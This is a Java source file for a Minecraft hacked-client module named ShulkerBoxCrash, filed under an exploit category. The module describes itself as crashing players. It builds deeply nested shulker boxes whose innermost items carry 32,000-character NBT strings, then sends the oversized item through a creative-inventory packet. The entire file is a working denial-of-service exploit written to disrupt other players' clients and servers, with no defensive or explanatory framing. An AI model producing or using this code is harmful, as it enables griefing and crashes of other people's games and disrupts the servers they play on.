package dev.oblivion.client.module.exploit;

import dev.oblivion.client.module.Category;
import dev.oblivion.client.module.Module;
import dev.oblivion.client.setting.impl.IntSetting;
import net.minecraft.component.DataComponentTypes;
import net.minecraft.component.type.ContainerComponent;
import net.minecraft.component.type.NbtComponent;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtList;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.text.Text;

import java.util.ArrayList;
import java.util.List;

public class ShulkerBoxCrash extends Module {

    private final IntSetting depth = settings.getDefaultGroup().add(
        new IntSetting.Builder().name("Depth").description("Nesting depth of shulkers.").defaultValue(10).min(1).max(50).build()
    );

    public ShulkerBoxCrash() {
        super("ShulkerBoxCrash", "Creates nested shulker boxes to crash players.", Category.EXPLOIT);
    }

    @Override
    protected void onEnable() {
        if (mc.player == null || mc.getNetworkHandler() == null) { disable(); return; }
        if (!mc.player.getAbilities().creativeMode) {
            mc.player.sendMessage(Text.literal("\u00a7c[ShulkerBoxCrash] Requires creative mode."), false);
            disable();
            return;
        }

        ItemStack innerItem = new ItemStack(Items.STONE, 64);
        NbtCompound innerNbt = new NbtCompound();
        innerNbt.putString("crash", "X".repeat(32000));
        innerItem.set(DataComponentTypes.CUSTOM_DATA, NbtComponent.of(innerNbt));

        ItemStack current = innerItem;
        for (int d = 0; d < depth.get(); d++) {
            ItemStack shulker = new ItemStack(Items.PURPLE_SHULKER_BOX, 1);
            List<ItemStack> contents = new ArrayList<>();
            for (int slot = 0; slot < 27; slot++) {
                contents.add(current.copy());
            }
            shulker.set(DataComponentTypes.CONTAINER, ContainerComponent.fromStacks(contents));
            current = shulker;
        }

        mc.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36, current));
        mc.player.sendMessage(Text.literal("\u00a7a[ShulkerBoxCrash] Nested shulker created."), false);
        disable();
    }
}
